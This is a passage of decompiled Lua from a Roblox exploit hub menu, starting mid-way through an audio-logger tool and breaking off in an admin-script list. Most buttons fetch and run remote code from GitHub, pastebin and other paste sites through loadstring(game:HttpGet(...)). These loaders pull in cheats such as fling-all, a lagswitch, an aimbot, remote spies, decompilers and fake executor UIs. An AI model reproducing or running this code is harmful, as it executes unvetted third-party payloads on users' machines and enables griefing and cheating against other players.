                printTable(writeaudio)
                wait(0.2)
                local vu162 = 0
                local function vu165()
                    local vu163 = nil
                    pcall(function()
                        vu163 = readfile("Audios" .. vu162 .. ".txt")
                    end)
                    if vu163 then
                        vu162 = vu162 + 1
                        vu165()
                    else
                        local v164 = tostring(GUI.Store.Text):gsub("\n", "\r\n")
                        writefile("Audios" .. vu162 .. ".txt", v164)
                    end
                end
                vu165()
                local v166 = vu162
                for _ = 1, 10 do
                    GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
                    wait(0.05)
                end
                GUI.Load.Visible = false
                GUI.Load.BackgroundTransparency = 0
                GUI.Load.Size = UDim2.new(0, 0, 0, 20)
                running = false
                GUI.Store.Visible = false
                GUI.Store.Text = ""
                writeaudio = {}
                game:FindService("StarterGui"):SetCore("SendNotification", {
                    Title = "Audio Logger",
                    Text = "Saved audios\n(Audios" .. v166 .. ".txt)",
                    Icon = "http://www.roblox.com/asset/?id=176572847",
                    Duration = 5
                })
            end
        else
            game:FindService("StarterGui"):SetCore("SendNotification", {
                Title = "Audio Logger",
                Text = "Exploit cannot writefile :(",
                Icon = "http://www.roblox.com/asset/?id=176572847",
                Duration = 5
            })
        end
    end)
    selectedaudio = nil
    function getaudio(p167)
        if running == false then
            GUI.Load.Visible = true
            running = true
            GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20), "Out", "Quad", 0.5, true)
            wait(0.3)
            local v168, v169, v170 = pairs(p167:GetDescendants())
            while true do
                local vu171
                v170, vu171 = v168(v169, v170)
                if v170 == nil then
                    break
                end
                spawn(function()
                    if vu171:IsA("Sound") and not (GUI.Logs:FindFirstChild(vu171.SoundId) or FindTable(ignore, vu171.SoundId)) then
                        local vu172 = string.match(vu171.SoundId, "rbxasset://sounds.+") or (string.match(vu171.SoundId, "&hash=.+") or string.match(vu171.SoundId, "%d+"))
                        if vu172 ~= nil then
                            local vu173 = GUI.Audio:Clone()
                            if string.sub(vu172, 1, 6) == "&hash=" or string.sub(vu172, 1, 7) == "&0hash=" then
                                vu172 = string.sub(vu172, string.sub(vu172, 1, 6) == "&hash=" and 7 or (string.sub(vu172, 1, 7) == "&0hash=" and 8 or false), string.len(vu172))
                                vu173.ImageButton.Image = "rbxassetid://1453863294"
                            end
                            vu173.Parent = GUI.Logs
                            vu173.Name = vu171.SoundId
                            vu173.Visible = true
                            vu173.Position = UDim2.new(0, 0, 0, pos)
                            GUI.Logs.CanvasSize = UDim2.new(0, 0, 0, pos + 20)
                            pos = pos + 20
                            local function v174()
                                Asset = game:GetService("MarketplaceService"):GetProductInfo(vu172)
                            end
                            local v175, _ = pcall(v174)
                            local vu176
                            if v175 then
                                vu173.TextLabel.Text = Asset.Name
                                vu176 = Asset.Name
                            else
                                vu173.TextLabel.Text = vu171.Name
                                vu176 = vu171.Name
                            end
                            local v177 = Instance.new("StringValue")
                            v177.Parent = vu173
                            v177.Value = vu171.SoundId
                            v177.Name = "ID"
                            local v178 = Instance.new("StringValue")
                            v178.Parent = vu173
                            v178.Value = vu176
                            v178.Name = "NAME"
                            local vu179 = false
                            vu173.ImageButton.MouseButton1Click:Connect(function()
                                if GUI.Info.Visible ~= true then
                                    if vu179 ~= false then
                                        vu179 = false
                                        vu173.ImageButton.BackgroundTransparency = 1
                                    else
                                        vu179 = true
                                        vu173.ImageButton.BackgroundTransparency = 0
                                    end
                                end
                            end)
                            vu173.Click.MouseButton1Click:Connect(function()
                                if GUI.Info.Visible ~= true then
                                    GUI.Info.TextLabel.Text = "Name: " .. vu176 .. "\n\nID: " .. vu171.SoundId .. "\n\nWorkspace Name: " .. vu171.Name
                                    selectedaudio = vu171.SoundId
                                    GUI.Info.Visible = true
                                end
                            end)
                        end
                    end
                end)
            end
        end
        for _ = 1, 10 do
            GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
            wait(0.05)
        end
        GUI.Load.Visible = false
        GUI.Load.BackgroundTransparency = 0
        GUI.Load.Size = UDim2.new(0, 0, 0, 20)
        running = false
    end
    GUI.All.MouseButton1Click:connect(function()
        getaudio(game)
    end)
    GUI.Workspace.MouseButton1Click:connect(function()
        getaudio(workspace)
    end)
    GUI.Lighting.MouseButton1Click:connect(function()
        getaudio(game:GetService("Lighting"))
    end)
    GUI.SoundS.MouseButton1Click:connect(function()
        getaudio(game:GetService("SoundService"))
    end)
    GUI.Clr.MouseButton1Click:connect(function()
        local v180, v181, v182 = pairs(GUI.Logs:GetChildren())
        while true do
            local v183
            v182, v183 = v180(v181, v182)
            if v182 == nil then
                break
            end
            if v183:FindFirstChild("ImageButton") then
                local v184 = v183:FindFirstChild("ImageButton")
                if v184.BackgroundTransparency == 1 then
                    v184.Parent:Destroy()
                    refreshlist()
                end
            end
        end
    end)
    GUI.ClrS.MouseButton1Click:connect(function()
        local v185, v186, v187 = pairs(GUI.Logs:GetChildren())
        while true do
            local v188
            v187, v188 = v185(v186, v187)
            if v187 == nil then
                break
            end
            if v188:FindFirstChild("ImageButton") then
                local v189 = v188:FindFirstChild("ImageButton")
                if v189.BackgroundTransparency == 0 then
                    v189.Parent:Destroy()
                    refreshlist()
                end
            end
        end
    end)
    autoscan = false
    GUI.AutoScan.MouseButton1Click:connect(function()
        if autoscan ~= false then
            autoscan = false
            GUI.AutoScan.BackgroundTransparency = 0
            game:FindService("StarterGui"):SetCore("SendNotification", {
                Title = "Audio Logger",
                Text = "Auto Scan DISABLED",
                Icon = "http://www.roblox.com/asset/?id=176572847",
                Duration = 5
            })
        else
            autoscan = true
            GUI.AutoScan.BackgroundTransparency = 0.5
            game:FindService("StarterGui"):SetCore("SendNotification", {
                Title = "Audio Logger",
                Text = "Auto Scan ENABLED",
                Icon = "http://www.roblox.com/asset/?id=176572847",
                Duration = 5
            })
        end
    end)
    game.DescendantAdded:connect(function(pu190)
        wait()
        if autoscan == true and pu190:IsA("Sound") and not (GUI.Logs:FindFirstChild(pu190.SoundId) or FindTable(ignore, pu190.SoundId)) then
            local vu191 = string.match(pu190.SoundId, "rbxasset://sounds.+") or (string.match(pu190.SoundId, "&hash=.+") or string.match(pu190.SoundId, "%d+"))
            if vu191 ~= nil then
                local vu192 = GUI.Audio:Clone()
                if string.sub(vu191, 1, 6) == "&hash=" or string.sub(vu191, 1, 7) == "&0hash=" then
                    vu191 = string.sub(vu191, string.sub(vu191, 1, 6) == "&hash=" and 7 or (string.sub(vu191, 1, 7) == "&0hash=" and 8 or false), string.len(vu191))
                    vu192.ImageButton.Image = "rbxassetid://1453863294"
                end
                vu192.Parent = GUI.Logs
                vu192.Name = pu190.SoundId
                vu192.Visible = true
                vu192.Position = UDim2.new(0, 0, 0, pos)
                local v193 = GUI.Logs.CanvasPosition.Y == GUI.Logs.CanvasSize.Y.Offset - 230
                GUI.Logs.CanvasSize = UDim2.new(0, 0, 0, pos + 20)
                pos = pos + 20
                local v194, _ = pcall(function()
                    Asset = game:GetService("MarketplaceService"):GetProductInfo(vu191)
                end)
                local vu195
                if v194 then
                    vu192.TextLabel.Text = Asset.Name
                    vu195 = Asset.Name
                else
                    vu192.TextLabel.Text = pu190.Name
                    vu195 = pu190.Name
                end
                local v196 = Instance.new("StringValue")
                v196.Parent = vu192
                v196.Value = pu190.SoundId
                v196.Name = "ID"
                local v197 = Instance.new("StringValue")
                v197.Parent = vu192
                v197.Value = vu195
                v197.Name = "NAME"
                local vu198 = false
                vu192.ImageButton.MouseButton1Click:Connect(function()
                    if GUI.Info.Visible ~= true then
                        if vu198 ~= false then
                            vu198 = false
                            vu192.ImageButton.BackgroundTransparency = 1
                        else
                            vu198 = true
                            vu192.ImageButton.BackgroundTransparency = 0
                        end
                    end
                end)
                vu192.Click.MouseButton1Click:Connect(function()
                    if GUI.Info.Visible ~= true then
                        GUI.Info.TextLabel.Text = "Name: " .. vu195 .. "\n\nID: " .. pu190.SoundId .. "\n\nWorkspace Name: " .. pu190.Name
                        selectedaudio = pu190.SoundId
                        GUI.Info.Visible = true
                    end
                end)
                if v193 == true then
                    GUI.Logs.CanvasPosition = Vector2.new(0, 1e43, 0, 0)
                end
            end
        end
    end)
    GUI.Info.Copy.MouseButton1Click:Connect(function()
        if not pcall(function()
            Synapse:Copy(selectedaudio)
        end) then
            (setclipboard or Clipboard.set)(selectedaudio)
        end
        game:FindService("StarterGui"):SetCore("SendNotification", {
            Title = "Audio Logger",
            Text = "Copied to clipboard",
            Icon = "http://www.roblox.com/asset/?id=176572847",
            Duration = 5
        })
    end)
    GUI.Info.Close.MouseButton1Click:Connect(function()
        GUI.Info.Visible = false
        local v199, v200, v201 = pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren())
        while true do
            local v202
            v201, v202 = v199(v200, v201)
            if v201 == nil then
                break
            end
            if v202.Name == "SampleSound" then
                v202:Destroy()
            end
        end
        GUI.Info.Listen.Text = "Listen"
    end)
    GUI.Info.Listen.MouseButton1Click:Connect(function()
        if GUI.Info.Listen.Text ~= "Listen" then
            local v203, v204, v205 = pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren())
            while true do
                local v206
                v205, v206 = v203(v204, v205)
                if v205 == nil then
                    break
                end
                if v206.Name == "SampleSound" then
                    v206:Destroy()
                end
            end
            GUI.Info.Listen.Text = "Listen"
        else
            local v207 = Instance.new("Sound")
            v207.Parent = game:GetService("Players").LocalPlayer.PlayerGui
            v207.Looped = true
            v207.SoundId = selectedaudio
            v207:Play()
            v207.Name = "SampleSound"
            v207.Volume = 5
            GUI.Info.Listen.Text = "Stop"
        end
    end)
    function drag(pu208)
        spawn(function()
            local v209 = game:GetService("UserInputService")
            local vu210 = nil
            local vu211 = nil
            local vu212 = nil
            local vu213 = nil
            local function vu216(p214)
                local v215 = p214.Position - vu212
                pu208:TweenPosition(UDim2.new(vu213.X.Scale, vu213.X.Offset + v215.X, vu213.Y.Scale, vu213.Y.Offset + v215.Y), "InOut", "Quart", 0.04, true, nil)
            end
            pu208.InputBegan:Connect(function(pu217)
                if pu217.UserInputType == Enum.UserInputType.MouseButton1 or pu217.UserInputType == Enum.UserInputType.Touch then
                    vu210 = true
                    vu212 = pu217.Position
                    vu213 = pu208.Position
                    pu217.Changed:Connect(function()
                        if pu217.UserInputState == Enum.UserInputState.End then
                            vu210 = false
                        end
                    end)
                end
            end)
            pu208.InputChanged:Connect(function(p218)
                if p218.UserInputType == Enum.UserInputType.MouseMovement or p218.UserInputType == Enum.UserInputType.Touch then
                    vu211 = p218
                end
            end)
            v209.InputChanged:Connect(function(p219)
                if p219 == vu211 and vu210 then
                    vu216(p219)
                end
            end)
        end)
    end
    drag(aa.PopupFrame)
    vu1:Notification("Notification", " Roblox Audio Logger Activated!", "Okay!")
end)
v91:Button("Enable Execute Scripts From msg box", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/chat-executor/main/chat-executor", true))()
    vu1:Notification("Notification", "Execute Scripts From msg box Activated!", "Okay!")
end)
v91:Button("Enable LagSwitch", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/Protected%20-%202023-05-28T225112.055.lua.txt", true))()
    vu1:Notification("Notification", "LagSwitch Activated!", "Okay!")
end)
v91:Button("Enable Destroy AppleWare IOS UI", function()
    if not Game:IsLoaded() then
        Game.Loaded:Wait()
    end
    local v220 = Game:GetService("CoreGui");
    (v220:FindFirstChild("AppleWare iOS") or v220:WaitForChild("AppleWareiOS")):Destroy()
    vu1:Notification("Notification", "Destroy AppleWare UI Activated!", "Okay!")
end)
v91:Button("Enable MotionBlur", function()
    local v221 = game:GetService("RunService")
    local _ = game:GetService("Players").LocalPlayer
    local vu222 = workspace.CurrentCamera
    local vu223 = Instance.new("BlurEffect")
    vu223.Size = 0
    vu223.Parent = vu222
    local vu224 = vu222.CFrame.Position
    local vu225 = vu222.CFrame.LookVector
    local vu226 = 0
    local vu227 = 0
    local vu228 = 0.2
    local vu229 = 20
    local vu230 = 10
    v221.RenderStepped:Connect(function()
        local v231 = vu222.CFrame.Position
        local v232 = vu222.CFrame.LookVector
        local v233 = (v231 - vu224).Magnitude
        local v234 = (v232 - vu225).Magnitude
        vu224 = v231
        vu225 = v232
        local v235 = v233 * vu229 + v234 * vu230
        vu226 = math.clamp(v235, 0, 56)
        vu227 = vu227 + (vu226 - vu227) * vu228
        vu223.Size = math.max(vu227, 0)
    end)
    vu1:Notification("Notification", "MotionBlur Activated!", "Okay!")
end)
v91:Button("Enable Fling ALL(Automatic)", function()
    loadstring(game:HttpGet("https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all"))()
    vu1:Notification("Notification", "Fling All Activated!", "Okay!")
end)
v91:Button("Enable Fling ALL(Manuel)", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
    vu1:Notification("Notification", "Fling All Activated!", "Okay!")
end)
v91:Button("Enable Hide/Show Fluxus", function()
    getgenv().prefixes = {
        hide = "hide",
        show = "show"
    }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Fluxus/main/Visibility/Toggle.lua", true))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Hide/Show Fluxus Activated!", "Okay!")
end)
v91:Button("Enable FPS Counter", function()
    loadstring(game:HttpGet("https://pastefy.app/c63s1M4w/raw", true))()
    vu1:Notification("Notification", "FPS Counter Activated!", "Okay!")
end)
v91:Button("Enable Blur Music Player", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Buage/Blur/refs/heads/main/BlurMain.lua"))()
    vu1:Notification("Notification", "Blur Music Player Activated!", "Okay!")
end)
local v236 = v81:Channel("\239\191\189\239\191\189\239\184\143 \226\128\162 TOOLS")
v236:Button("Enable Q-Tool ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/qtoolv3/main/qtoolv3", true))()
    vu1:Notification("Notification", "Q-Tool Activated!", "Okay!")
end)
v236:Button("Enable C-Tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/ctool/main/ctool", true))()
    vu1:Notification("Notification", "C-Tool Activated!", "Okay!")
end)
v236:Button("Enable V-Tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/vtool/main/vtool", true))()
    vu1:Notification("Notification", "V-Tool Activated!", "Okay!")
end)
v236:Button("Enable P-Tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/P-TOOL/main/P-tool", true))()
    vu1:Notification("Notification", "P-Tool Activated!", "Okay!")
end)
v236:Button("Enable A-Tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/a-tool/main/a-tool", true))()
    vu1:Notification("Notification", "A-Tool Activated!", "Okay!")
end)
v236:Button("Enable K-Tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/k-tool/main/k-tool", true))()
    vu1:Notification("Notification", "K-Tool Activated!", "Okay!")
end)
v236:Button("Enable E-Tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/e-tool/main/e-tool", true))()
    vu1:Notification("Notification", "E-Tool Activated!", "Okay!")
end)
v236:Button("Enable Left Click Tool", function()
    getgenv().keytoclick = "LeftControl"
    tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = keytoclick
    tool.Activated:connect(function()
        game:service("VirtualInputManager"):SendKeyEvent(true, keytoclick, false, game)
    end)
    tool.Parent = game.Players.LocalPlayer.Backpack
    game.StarterGui:SetCore("SendNotification", {
        Title = "zvsf",
        Text = "discord.gg/productions"
    })
    local vu237 = game.Players.LocalPlayer;
    (function()
        vu237.CharacterAdded:Connect(onCharacterAdded)
    end)()
    vu237.CharacterRemoving:Connect(function()
        tool.Parent = game.Players.LocalPlayer.Backpack
    end)
    vu1:Notification("Notification", "Left Click Tool Activated!", "Okay!")
end)
v236:Button("Enable RightControl Tool", function()
    getgenv().keytoclick = "RightControl"
    tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = keytoclick
    tool.Activated:connect(function()
        game:service("VirtualInputManager"):SendKeyEvent(true, keytoclick, false, game)
    end)
    tool.Parent = game.Players.LocalPlayer.Backpack
    game.StarterGui:SetCore("SendNotification", {
        Title = "zvsf",
        Text = "discord.gg/productions"
    })
    local vu238 = game.Players.LocalPlayer;
    (function()
        vu238.CharacterAdded:Connect(onCharacterAdded)
    end)()
    vu238.CharacterRemoving:Connect(function()
        tool.Parent = game.Players.LocalPlayer.Backpack
    end)
    vu1:Notification("Notification", "RightControl Tool Activated!", "Okay!")
end)
v236:Button("Enable Tool-Giver", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/4yGehrgh"))()
    vu1:Notification("Notification", "Tool-Giver Activated!", "Okay!")
end)
v236:Button("Enable TP-TOOL", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/tptool/main/tptool", true))()
    vu1:Notification("Notification", "TP-TOOL Activated!", "Okay!")
end)
v236:Button("Enable B-ToolsV2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/btoolsv2/main/btoolsv2", true))()
    vu1:Notification("Notification", "B-ToolsV2 Activated!", "Okay!")
end)
v236:Button("Enable AutoClicker ", function()
    getgenv().key = "Hostile"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/The-telligence/main/MC%20KSystem%202"))()
    vu1:Notification("Notification", " AutoClicker Activated!", "Okay!")
end)
v236:Button("Enable AutoClicker", function()
    loadstring(game:HttpGetAsync("https://pastebin.com/raw/WgkcDYUs"))()
    vu1:Notification("Notification", " AutoClicker Activated!", "Okay!")
end)
v236:Button("Enable Aimmerz V2", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/pleaseful/340594344eb73891941d2d01af742618/raw/dd2308f3aafc22d82f976dbe0da7ec0fb74fadac/Aimmerz%2520V2.lua"))()
    vu1:Notification("Notification", "Aimmerz V2 Activated!", "Okay!")
end)
v236:Button("Enable Fps-viewer ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sempiller/sdluniversal/main/fpsviewer.lua"))()
    vu1:Notification("Notification", "Fps-Viewer Activated!", "Okay!")
end)
v236:Button("Enable Simple Spy(Mobile)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RS/main/SimpleSpyMobile"))()
    vu1:Notification("Notification", "Simple Spy(Mobile) Activated!", "Okay!")
end)
v236:Button("Enable Devx-Explorer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
    vu1:Notification("Notification", "Devx-Explorer Activated!", "Okay!")
end)
v236:Button("Enable DEX-Explorer(MOBILE-REDzHUB)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/DEX-Explorer/main/Mobile.lua"))()
    vu1:Notification("Notification", "DEX-Explorer Activated!", "Okay!")
end)
v236:Button("Enable Dark Dex v4(BetterDecompiler built in)", function()
    loadstring(game:HttpGet("https://github.com/OfficiallyMelon/BetterDecompiler/raw/main/dex_betterdecompiler.lua"))()
    vu1:Notification("Notification", "Dark Dex v4 Activated!", "Okay!")
end)
v236:Button("Enable Optimized DEX(Solara)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HummingBird8/HummingRn/main/OptimizedDexForSolara.lua"))()
    vu1:Notification("Notification", "OptimizedDexForSolara Activated!", "Okay!")
end)
v236:Button("Enable Executor Checker Panel ALL IN ONE GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RealBatu20/AI-Scripts-2025/refs/heads/main/ExecutorTestsPanel.lua"))()
    vu1:Notification("Notification", "Executor Checker Panel ALL IN ONE GUI", "Okay!")
end)
v236:Button("Enable UNC Environment Check", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/main/UNCCheckEnv.lua", true))()
    vu1:Notification("Notification", "UNC Environment Check Activated!", "Okay!")
end)
v236:Button("Enable sUNC - Expose UNC fakers", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HummingBird8/HummingRn/main/sUNCTestGET"))()
    vu1:Notification("Notification", "sUNC - Expose UNC fakers Activated!", "Okay!")
end)
v236:Button("Enable Official sUNC ", function()
    loadstring(game:HttpGet("https://gitlab.com/sens3/nebunu/-/raw/main/HummingBird8\'s_sUNC_yes_i_moved_to_gitlab_because_my_github_acc_got_brickedd/sUNCm0m3n7.lua"))()
    vu1:Notification("Notification", "sUNC", "Okay!")
end)
v236:Button("Enable MoreUNC", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/moreunc/main/moreunc", true))()
    vu1:Notification("Notification", "MoreUNC Activated!", "Okay!")
end)
v236:Button("Enable printidentity validator", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/randois/main/randois", true))()
    vu1:Notification("Notification", "printidentity validator Activated!", "Okay!")
end)
v236:Button("Enable httpspy", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/sdsaa/main/httpspy", true))()
    vu1:Notification("Notification", "httpspy  Activated!", "Okay!")
end)
v236:Button("Enable httpspyV2 (BETTERUI)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/httpspyv2/main/httpspybetterui", true))()
    vu1:Notification("Notification", "httpspyv2 Activated!", "Okay!")
end)
v236:Button("Enable MusicVolume(SoundID)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/sdsaa/main/httpspy", true))()
    vu1:Notification("Notification", "MusicVolume Activated!", "Okay!")
end)
v236:Button("Enable Kulthx Console", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nizartitwaniii/KulthX-console-/main/KulthX%20console%20v2.5"))()
    vu1:Notification("Notification", "Kulthx Console Activated!", "Okay!")
end)
v236:Button("Enable WebHook Tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxhh/universalscripts/main/webhook_tools"))()
    vu1:Notification("Notification", "Kulthx Console Activated!", "Okay!")
end)
local v239 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 EXECUTOR-UI")
v239:Button("Enable KRNL MOBILE UI", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/M3HjLPU7"))()
    vu1:Notification("Notification", "KRNL MOBILE UI Activated!", "Okay!")
end)
v239:Button("Enable KRNL REMAKE", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreezyWare/Remake-Executor/main/Executor/Krnl-Legacy.Lua"))()
    vu1:Notification("Notification", "KRNL REMAKE Activated!", "Okay!")
end)
v239:Button("Enable Synapse-X-Remake", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))()
    vu1:Notification("Notification", "Synapse-X-Remake Activated!", "Okay!")
end)
v239:Button("Enable Arceusv3", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
    vu1:Notification("Notification", "Arceus Activated!", "Okay!")
end)
v239:Button("Enable Solara internal UI V2 FANMADE", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/solaraui/main/solaraui"))()
    vu1:Notification("Notification", "Solara internal UI V2 FANMADE Activated!", "Okay!")
end)
v239:Button("Enable Incognito UI Remake", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/sdssdasd/main/sdsdds", true))()
    vu1:Notification("Notification", "Incognito UI Remake Activated!", "Okay!")
end)
v239:Button("Enable Krampus.gg REMAKE", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreezyWare/Remake-Executor/main/Executor/Krampus.Lua"))()
    vu1:Notification("Notification", "Krampus.gg REMAKE Activated!", "Okay!")
end)
v239:Label("Delete UI (Press Delete key)")
v239:Label("Toggle UI (Press P key)")
v239:Button("Enable Random executor UI", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))()
    vu1:Notification("Notification", "executor Activated!", "Okay!")
end)
v239:Button("Enable LEVEL 4 EXECUTOR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/LEVEL4/main/LEVEL41", true))()
    vu1:Notification("Notification", "LEVEL 4 EXECUTOR  Activated!", "Okay!")
end)
v239:Button("Enable StopX", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/stopx/main/stopx", true))()
    vu1:Notification("Notification", "StopX Activated!", "Okay!")
end)
v239:Button("Enable Codex", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Codex.lua", true))()
    vu1:Notification("Notification", "Codex Activated!", "Okay!")
end)
v239:Button("Enable Codex Android", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KevinScripts2024/Code/main/HellNah", true))()
    vu1:Notification("Notification", "Codex Android Activated!", "Okay!")
end)
v239:Button("Enable Krypton", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Krypton.lua", true))()
    vu1:Notification("Notification", "Krypton Activated!", "Okay!")
end)
v239:Button("Enable EXECUTE | UI LIBRARY", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Execute%20%7C%20UI%20Library.lua", true))()
    vu1:Notification("Notification", "EXECUTE | UI LIBRARY Activated!", "Okay!")
end)
v239:Button("Enable Kiwi-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Script/main/Kiwi-Ui.lua", true))()
    vu1:Notification("Notification", "Kiwi-X nActivated!", "Okay!")
end)
v239:Button("Enable Evon UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/ata2.txt", true))()
    vu1:Notification("Notification", "Evon UI nActivated!", "Okay!")
end)
v239:Button("Enable Vega X UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/ata3.txt", true))()
    vu1:Notification("Notification", "Vega X UI nActivated!", "Okay!")
end)
v239:Button("Enable Fluxus Coral UI", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Fluxus-Coral-Remake-7112"))()
    vu1:Notification("Notification", "Fluxus Coral Activated!", "Okay!")
end)
v239:Button("Enable Fluxus PC/UWP UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/fluxusui/main/fluxusuiuwp", true))()
    vu1:Notification("Notification", "Fluxus Activated!", "Okay!")
end)
v239:Button("Enable Electron Mobile UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/electronui/main/electronui", true))()
    vu1:Notification("Notification", "Fluxus Activated!", "Okay!")
end)
v239:Button("Enable Trigon UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/trigonnormal.lua", true))()
    vu1:Notification("Notification", "Trigon Activated!", "Okay!")
end)
v239:Button("Enable Dear ImGui Style UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreezyWare/Roblox/main/Executor/Internal.lua"))()
    vu1:Notification("Notification", "Dear ImGui Style UI Activated!", "Okay!")
end)
v239:Button("Enable Delta X(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/deltax/main/deltax", true))()
    vu1:Notification("Notification", "Delta X Activated!", "Okay!")
end)
v239:Button("Enable Delta X 2024", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KevinScripts2024/Deltozoz/main/Rick%20rolled", true))()
    vu1:Notification("Notification", "Delta X Activated!", "Okay!")
end)
v239:Button("Enable AppleWare V1 UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TableDevelopments/public/main/ui.lua", true))()
    vu1:Notification("Notification", "AppleWare V1 UI Activated!", "Okay!")
end)
v239:Button("Enable Cubix V1 UI", function()
    loadstring(game:HttpGet("https://github.com/1dontgiveaf/testscript69/raw/main/Cubix", true))()
    vu1:Notification("Notification", "Cubix V1 UI Activated!", "Okay!")
end)
v239:Button("Enable Cubix UI (Latest Verison)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AnyaHubsV2/CMDXCBX/main/CubixBeta.lua"))()
    vu1:Notification("Notification", "Cubix V1.4 UI Activated!", "Okay!")
end)
v239:Button("Enable Hydrogen UI (OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AnyaHubsV2/executer/main/Hydroui.lua"))()
    vu1:Notification("Notification", "Hydrogen UI Activated!", "Okay!")
end)
v239:Button("Enable Punk Team UI (UNRELEASED)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/punkteamui/main/punkteamui"))()
    vu1:Notification("Notification", "Punk Team ui Activated!", "Okay!")
end)
v239:Button("Enable Punk Team UI BETA (UNRELEASED)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KevinScripts2024/Hufuddixidke8vogd/main/Vdurigofeod8f"))()
    vu1:Notification("Notification", "Punk Team ui Activated!", "Okay!")
end)
v239:Button("Enable Arceus X FANMADE (PC) UI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/areceusxpc/main/arceusxppc"))()
    vu1:Notification("Notification", "Arceus X FANMADE (PC) UI Activated!", "Okay!")
end)
local v240 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 ADMIN")
v240:Button("Enable Infinite Yield ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    vu1:Notification("Notification", "Infinite Yield Activated!", "Okay!")
end)
v240:Button("Enable Nameless Admin ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
